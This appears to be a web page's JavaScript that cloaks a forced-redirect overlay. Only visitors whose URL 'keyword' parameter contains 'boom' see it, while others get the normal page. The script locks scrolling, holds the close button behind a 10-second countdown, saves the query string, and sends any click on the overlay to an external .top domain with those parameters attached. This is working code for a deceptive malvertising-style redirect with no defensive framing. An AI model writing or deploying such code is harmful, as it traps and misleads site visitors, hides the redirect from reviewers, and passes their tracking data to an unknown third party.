const url = new URL(window.location.href);
const keywordValue = url.searchParams.get("keyword");

cookieBanner.style.display = 'none';

if (!keywordValue || !/boom/.test(keywordValue)) {
    // window.location.href = '/site';
    document.querySelector('.banner').style.display = 'none';
    document.querySelector('.bg-banner').style.display = 'none';
    document.body.style.overflow = 'auto';
    document.documentElement.style.overflow = 'auto';

    cookieBanner.style.display = 'block';
} else {
    if (location.search) {
        localStorage.setItem('savedQuery', location.search);
    }
}

document.addEventListener('DOMContentLoaded', function () {
    const closeBtn = document.getElementById('closeBtn');
    const banner = document.getElementById('banner');
    let countdown = 10;

    const countdownInterval = setInterval(function () {
        countdown--;
        if (countdown <= 0) {
            clearInterval(countdownInterval);
            closeBtn.textContent = '×';
            closeBtn.classList.add('active');
            closeBtn.style.cursor = 'pointer';
        } else {
            closeBtn.textContent = countdown;
        }
    }, 1000);

    closeBtn.addEventListener('click', function (event) {
        event.stopPropagation();
        if (closeBtn.classList.contains('active')) {
            // window.location.href = '/site';
            document.querySelector('.banner').style.display = 'none';
            document.querySelector('.bg-banner').style.display = 'none';
            document.body.style.overflow = 'auto';
            document.documentElement.style.overflow = 'auto';

            cookieBanner.style.display = 'block';
        }
    });

    banner.addEventListener('click', function (event) {
        if (!event.target.closest('.close-btn')) {
            const savedQuery = localStorage.getItem('savedQuery');
            const redirectUrl = `https://aviacompassupr.top/XM7BRh${savedQuery ? savedQuery : ''}`;
            window.location.href = redirectUrl;
        }
    });
});